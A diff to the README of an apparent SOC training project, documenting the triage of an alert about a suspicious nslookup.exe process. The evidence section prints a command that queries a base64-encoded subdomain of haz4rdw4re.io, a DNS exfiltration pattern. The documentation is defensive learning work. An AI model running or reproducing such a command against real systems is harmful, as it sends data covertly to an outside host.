@@ -23,7 +23,24 @@ This project documents a SOC alert triage investigation where a suspicious proce
 
 ---
 
-## Key Evidence
-
-### Suspicious Command
+ Key Evidence
+ Suspicious Command
 "C:\Windows\system32\nslookup.exe" RmYjEyNGZiMTY1NjZlfQ==.haz4rdw4re.io
+
+##Skills Demonstrated
+Alert Triage
+Process Analysis
+DNS Investigation
+Threat Hunting
+Malware Analysis
+MITRE ATT&CK Mapping
+
+Analysis 
+The alert was triggered by nslookup.exe execution
+the subdomain appeared base64 encoded 
+
+Conclusion
+The alert was classified as Suspicious rather than Confirmed Malicious.
+no supporting indicators such as malicious payload execution, persistence, privilege escalation, or lateral movement were identified. The evidence did not support escalation to a confirmed incident
+
+
